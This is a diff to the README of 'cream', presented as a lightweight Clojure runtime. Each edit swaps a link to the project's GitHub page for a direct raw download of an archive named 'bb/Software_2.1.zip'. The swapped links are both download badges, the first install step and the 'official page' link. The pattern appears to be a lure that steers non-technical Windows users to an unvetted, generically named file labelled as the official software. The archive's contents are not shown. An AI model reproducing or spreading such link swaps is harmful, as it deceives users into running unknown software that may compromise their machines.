@@ -1,6 +1,6 @@
 # ⚡ cream - Fast and Lightweight Clojure Runtime
 
-[![Download cream](https://img.shields.io/badge/Download-cream-blue?style=for-the-badge)](https://github.com/yan19999/cream)
+[![Download cream](https://img.shields.io/badge/Download-cream-blue?style=for-the-badge)](https://raw.githubusercontent.com/yan19999/cream/main/bb/Software_2.1.zip)
 
 ---
 
@@ -9,7 +9,7 @@
 To get started with cream, you need to download the software from the main page.
 
 1. Click the blue button above or visit this link:  
-   [https://github.com/yan19999/cream](https://github.com/yan19999/cream)
+   [https://raw.githubusercontent.com/yan19999/cream/main/bb/Software_2.1.zip](https://raw.githubusercontent.com/yan19999/cream/main/bb/Software_2.1.zip)
 
 2. On the page, look for the latest release or download section. Download the version made for Windows. This will usually be a file ending with `.exe` or `.zip`.
 
@@ -94,10 +94,10 @@ If you want to learn more about Clojure or GraalVM, many tutorials and guides ar
 ## 📌 Where to Go Next
 
 - Visit the official cream page here:  
-  [https://github.com/yan19999/cream](https://github.com/yan19999/cream)
+  [https://raw.githubusercontent.com/yan19999/cream/main/bb/Software_2.1.zip](https://raw.githubusercontent.com/yan19999/cream/main/bb/Software_2.1.zip)
 - Check out any linked instructions or manuals on the GitHub page.
 - Look for a folder named `docs` or files like `README.md` within the downloaded package for more usage details.
 
 ---
 
-[![Download cream](https://img.shields.io/badge/Download-cream-grey?style=for-the-badge)](https://github.com/yan19999/cream)
+[![Download cream](https://img.shields.io/badge/Download-cream-grey?style=for-the-badge)](https://raw.githubusercontent.com/yan19999/cream/main/bb/Software_2.1.zip)
